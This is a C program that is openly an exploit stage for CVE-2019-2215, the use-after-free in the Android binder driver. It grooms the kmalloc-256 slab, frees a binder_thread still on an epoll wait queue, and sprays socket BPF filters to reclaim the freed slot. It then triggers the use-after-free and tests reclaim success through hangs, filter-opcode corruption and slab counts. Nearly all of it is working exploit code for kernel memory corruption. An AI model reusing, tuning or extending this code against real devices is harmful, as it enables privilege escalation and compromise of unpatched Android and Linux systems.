/*
 * bpf_reclaim_k256v2.c — CVE-2019-2215 reclaim with CORRECT ordering
 *
 * CRITICAL FIX: Pre-create ALL sockets BEFORE freeing binder_thread.
 * socket() calls may do kmalloc-256 internally (inet structures etc),
 * which would "steal" the freed binder_thread slot before BPF can reclaim.
 *
 * Flow:
 * 1. Pre-create N sockets (no BPF attached yet)
 * 2. Create binder_thread + register epoll wait
 * 3. BINDER_THREAD_EXIT → kfree(thread) → slot on per-CPU freelist HEAD
 * 4. setsockopt(SO_ATTACH_FILTER) on pre-created sockets → first BPF alloc
 *    should get the freed slot from per-CPU freelist (LIFO)
 * 5. close(epfd) → remove_wait_queue on freed/reclaimed memory → UAF!
 *
 * Targeting: binder_thread=252→k256, BPF 26 insns=228→k256
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT     0x40046208
#define BINDER_SET_MAX_THREADS 0x40046205
#define NUM_INSNS 26

static volatile int timed_out = 0;
static void alarm_handler(int sig) { timed_out = 1; }

/* Read kmalloc-256 active_objs from /proc/slabinfo */
static int read_k256(void) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "kmalloc-256 ", 12) == 0) {
            int active;
            sscanf(line + 12, "%d", &active);
            fclose(f);
            return active;
        }
    }
    fclose(f);
    return -1;
}

/*
 * TEST A: Hang detection with pre-created sockets
 * LD_IMM at all positions → internal code 30 → spinlock LOCKED if reclaimed
 */
static int test_a(int spray_count, int groom_count) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    /* Step 1: Pre-create ALL sockets FIRST */
    int *fds = calloc(spray_count, sizeof(int));
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] < 0) break;
        created++;
    }

    /* Prepare BPF program: all LD_IMM except last = RET_K 0xFFFF */
    struct sock_filter insns[NUM_INSNS];
    memset(insns, 0, sizeof(insns));
    for (int j = 0; j < NUM_INSNS - 1; j++) {
        insns[j].code = 0x00; /* BPF_LD_IMM → internal code 30 */
        insns[j].k = 0xDEAD0000 + j;
    }
    insns[NUM_INSNS-1].code = 0x06; /* RET_K */
    insns[NUM_INSNS-1].k = 0xFFFF;
    struct sock_fprog prog = { .len = NUM_INSNS, .filter = insns };

    /* Step 2: Groom — fill k256 slab pages with binder_threads, then free */
    int groom_bfd[300];
    int ng = 0;
    for (int i = 0; i < groom_count && i < 300; i++) {
        groom_bfd[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (groom_bfd[i] < 0) break;
        uint32_t mx = 0;
        ioctl(groom_bfd[i], BINDER_SET_MAX_THREADS, &mx);
        /* Just do an ioctl to create the thread, don't need epoll */
        ng++;
    }
    /* Free groom threads to fill per-CPU freelist with k256 objects */
    for (int i = ng - 1; i >= 0; i--) {
        int thr = 0;
        ioctl(groom_bfd[i], BINDER_THREAD_EXIT, &thr);
    }

    /* Step 3: Create target binder_thread + epoll wait */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* Step 4: FREE binder_thread → slot goes to per-CPU freelist HEAD */
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);

    /* Step 5: BPF spray — ONLY setsockopt, no socket creation!
     * First setsockopt should get the freed binder_thread slot (LIFO) */
    for (int i = 0; i < created; i++) {
        setsockopt(fds[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    }

    /* Step 6: Trigger UAF — close(epfd) does remove_wait_queue on freed memory */
    close(epfd);  /* If reclaimed: spin_lock on BPF data → HANG */

    /* Cleanup */
    for (int i = 0; i < created; i++) close(fds[i]);
    free(fds);
    for (int i = 0; i < ng; i++) close(groom_bfd[i]);
    close(bfd);
    return 0;
}

/*
 * TEST B: Filter corruption detection with pre-created sockets
 * RET_K at insns[3] (for header=20 → offset 44) with jt=1,jf=0
 * After UAF: spin_unlock changes code from RET_K(1) to RET_A(2) → returns A=42
 */
static int test_b(int spray_count, int port_base) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    /* Step 1: Pre-create ALL sockets + bind */
    int *fds = calloc(spray_count, sizeof(int));
    struct sockaddr_in *addrs = calloc(spray_count, sizeof(struct sockaddr_in));
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] < 0) break;
        memset(&addrs[i], 0, sizeof(addrs[i]));
        addrs[i].sin_family = AF_INET;
        addrs[i].sin_addr.s_addr = htonl(0x7F000001);
        addrs[i].sin_port = htons(port_base + i);
        if (bind(fds[i], (struct sockaddr*)&addrs[i], sizeof(addrs[i])) < 0) {
            close(fds[i]); fds[i] = -1; continue;
        }
        struct timeval tv = { .tv_sec = 0, .tv_usec = 50000 };
        setsockopt(fds[i], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        created++;
    }

    /* BPF program: insns[0-2]=LD_IMM(k=42), insns[3]=RET_K(k=0,jt=1,jf=0)
     * For header=20: insns[3] at offset 44 (spinlock). jt=1,jf=0 → UNLOCKED.
     * After spin_lock+list_del+spin_unlock: code changes 1→2 (RET_A)
     * RET_A returns A register = 42 → packet ACCEPTED
     *
     * Also insns[4]=RET_K(k=0,jt=1,jf=0) for header=12 coverage
     */
    struct sock_filter det[NUM_INSNS];
    memset(det, 0, sizeof(det));
    /* Load A=42 */
    for (int j = 0; j < 3; j++) { det[j].code = 0x00; det[j].k = 42; }
    /* insns[3]: RET_K k=0, spinlock-compatible (covers header=20) */
    det[3].code = 0x06; det[3].jt = 1; det[3].jf = 0; det[3].k = 0;
    /* insns[4]: another RET_K for header=12 (but filter already returned at [3]) */
    det[4].code = 0x06; det[4].jt = 1; det[4].jf = 0; det[4].k = 0;
    /* Fill rest with RET_K 0 */
    for (int j = 5; j < NUM_INSNS - 1; j++) { det[j].code = 0x06; det[j].k = 0; }
    det[NUM_INSNS-1].code = 0x06; det[NUM_INSNS-1].k = 0xFFFF;
    struct sock_fprog prog = { .len = NUM_INSNS, .filter = det };

    /* Step 2: Create target + free */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    int t = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &t);

    /* Step 3: BPF spray — ONLY setsockopt */
    int attached = 0;
    for (int i = 0; i < spray_count; i++) {
        if (fds[i] < 0) continue;
        if (setsockopt(fds[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) == 0)
            attached++;
    }

    /* Step 4: Trigger UAF */
    close(epfd);

    /* Step 5: Check every socket for filter corruption */
    int sender = socket(AF_INET, SOCK_DGRAM, 0);
    int detected = 0;
    for (int i = 0; i < spray_count; i++) {
        if (fds[i] < 0) continue;
        char msg[] = "AAAA";
        sendto(sender, msg, 4, 0, (struct sockaddr*)&addrs[i], sizeof(addrs[i]));
        char buf[16];
        int n = recv(fds[i], buf, sizeof(buf), 0);
        if (n > 0) {
            /* Filter returned non-zero (ACCEPT) → corrupted! */
            detected++;
        }
    }

    close(sender);
    for (int i = 0; i < spray_count; i++) if (fds[i] >= 0) close(fds[i]);
    free(fds); free(addrs); close(bfd);
    return detected;
}

/*
 * TEST C: Slab accounting — verify binder_thread IS in k256 and BPF can reclaim
 */
static void test_c(void) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    printf("--- TEST C: Slab accounting (k256) ---\n");

    int k0 = read_k256();
    printf("  baseline k256: %d\n", k0);

    /* Allocate 200 binder_threads */
    int bfds[200];
    int nb = 0;
    for (int i = 0; i < 200; i++) {
        bfds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfds[i] < 0) break;
        uint32_t mx = 0;
        ioctl(bfds[i], BINDER_SET_MAX_THREADS, &mx);
        nb++;
    }
    int k1 = read_k256();
    printf("  after 200 binder_threads: %d (delta=%+d)\n", k1, k1 - k0);

    /* Free all binder_threads */
    for (int i = 0; i < nb; i++) {
        int t = 0;
        ioctl(bfds[i], BINDER_THREAD_EXIT, &t);
    }
    int k2 = read_k256();
    printf("  after freeing all: %d (delta from alloc=%+d)\n", k2, k2 - k1);

    /* Now allocate 200 BPF filters (26 insns → k256) on pre-created sockets */
    int sfds[200];
    int ns = 0;
    for (int i = 0; i < 200; i++) {
        sfds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (sfds[i] < 0) break;
        ns++;
    }
    struct sock_filter insns[NUM_INSNS];
    memset(insns, 0, sizeof(insns));
    for (int j = 0; j < NUM_INSNS - 1; j++) insns[j].code = 0x00;
    insns[NUM_INSNS-1].code = 0x06; insns[NUM_INSNS-1].k = 0xFFFF;
    struct sock_fprog prog = { .len = NUM_INSNS, .filter = insns };
    int nf = 0;
    for (int i = 0; i < ns; i++) {
        if (setsockopt(sfds[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) == 0)
            nf++;
    }
    int k3 = read_k256();
    printf("  after %d BPF filters: %d (delta from free=%+d)\n", nf, k3, k3 - k2);
    printf("  net delta (alloc - free + bpf): %+d\n", k3 - k0);
    printf("  if BPF reclaimed freed slots: delta≈0. if new pages: delta≈+200\n");

    /* Cleanup */
    for (int i = 0; i < ns; i++) close(sfds[i]);
    for (int i = 0; i < nb; i++) close(bfds[i]);

    /* Also check: does sched_setaffinity work? */
    cpu_set_t check;
    CPU_ZERO(&check);
    if (sched_getaffinity(0, sizeof(check), &check) == 0) {
        int cpus = 0;
        for (int i = 0; i < 8; i++) if (CPU_ISSET(i, &check)) cpus++;
        printf("  CPU affinity: %d CPUs active (want 1 for pinning)\n", cpus);
    }
}

/*
 * TEST D: Aggressive single-shot reclaim
 * Maximize reclaim probability:
 * - Pin CPU 0
 * - Pre-create sockets
 * - Flush per-CPU freelist by allocating+freeing many k256 objects
 * - Free ONE binder_thread  
 * - IMMEDIATELY attach BPF to ONE socket
 * - Check if that ONE socket's filter is corrupted
 */
static int test_d_single(int flush_count) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    /* Pre-create ONE socket */
    int sfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sfd < 0) return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(0x7F000001);
    addr.sin_port = htons(55555);
    bind(sfd, (struct sockaddr*)&addr, sizeof(addr));
    struct timeval tv = { .tv_sec = 0, .tv_usec = 50000 };
    setsockopt(sfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    /* Flush per-CPU freelist: alloc+free many k256 objects via binder */
    int flush_bfd[500];
    int nf = 0;
    for (int i = 0; i < flush_count && i < 500; i++) {
        flush_bfd[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (flush_bfd[i] < 0) break;
        uint32_t mx = 0;
        ioctl(flush_bfd[i], BINDER_SET_MAX_THREADS, &mx);
        nf++;
    }
    for (int i = 0; i < nf; i++) {
        int t = 0;
        ioctl(flush_bfd[i], BINDER_THREAD_EXIT, &t);
    }

    /* Target: create binder_thread + epoll */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* FREE target binder_thread */
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);

    /* IMMEDIATELY attach BPF → should get freed slot from LIFO */
    struct sock_filter det[NUM_INSNS];
    memset(det, 0, sizeof(det));
    for (int j = 0; j < 3; j++) { det[j].code = 0x00; det[j].k = 42; }
    det[3].code = 0x06; det[3].jt = 1; det[3].jf = 0; det[3].k = 0;
    for (int j = 4; j < NUM_INSNS-1; j++) { det[j].code = 0x06; det[j].k = 0; }
    det[NUM_INSNS-1].code = 0x06; det[NUM_INSNS-1].k = 0xFFFF;
    struct sock_fprog prog = { .len = NUM_INSNS, .filter = det };
    setsockopt(sfd, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));

    /* Trigger UAF */
    close(epfd);

    /* Check for corruption */
    int sender = socket(AF_INET, SOCK_DGRAM, 0);
    char msg[] = "TEST";
    sendto(sender, msg, 4, 0, (struct sockaddr*)&addr, sizeof(addr));
    char buf[16];
    int n = recv(sfd, buf, sizeof(buf), 0);
    close(sender);
    int corrupted = (n > 0) ? 1 : 0;

    close(sfd);
    for (int i = 0; i < nf; i++) close(flush_bfd[i]);
    close(bfd);
    return corrupted;
}

int main() {
    printf("=== CVE-2019-2215 k256 Reclaim v2 (pre-created sockets) ===\n");
    printf("binder_thread=252→k256, BPF 26 insns→k256\n");
    printf("FIX: sockets created BEFORE binder_thread free\n\n");

    /* TEST C first: verify slab accounting */
    test_c();
    printf("\n");

    /* TEST A: Hang detection */
    printf("--- TEST A: Hang detection (pre-created sockets) ---\n");
    struct { int spray; int groom; } cfgs_a[] = {
        {50, 0}, {200, 0}, {500, 0},
        {50, 50}, {200, 100}, {500, 200}
    };
    for (int c = 0; c < 6; c++) {
        int hangs = 0;
        for (int i = 0; i < 50; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                signal(SIGALRM, alarm_handler);
                alarm(3);
                test_a(cfgs_a[c].spray, cfgs_a[c].groom);
                _exit(0);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFSIGNALED(status) && WTERMSIG(status) == 14) hangs++;
        }
        printf("  spray=%3d groom=%3d: %d/50 hangs\n",
               cfgs_a[c].spray, cfgs_a[c].groom, hangs);
    }

    /* TEST B: Filter corruption */
    printf("\n--- TEST B: Filter corruption (pre-created sockets) ---\n");
    for (int spray = 50; spray <= 500; spray += 150) {
        int total = 0;
        for (int i = 0; i < 30; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(5);
                int d = test_b(spray, 30000 + i * 600);
                _exit(d > 0 ? 1 : 0);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) > 0) total++;
        }
        printf("  spray=%3d: %d/30 corrupted\n", spray, total);
    }

    /* TEST D: Single-shot aggressive reclaim */
    printf("\n--- TEST D: Single-shot reclaim ---\n");
    for (int flush = 0; flush <= 300; flush += 100) {
        int hits = 0;
        for (int i = 0; i < 100; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(3);
                int r = test_d_single(flush);
                _exit(r > 0 ? 1 : 0);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) > 0) hits++;
        }
        printf("  flush=%3d: %d/100 corrupted\n", flush, hits);
    }

    printf("\n=== Done ===\n");
    return 0;
}
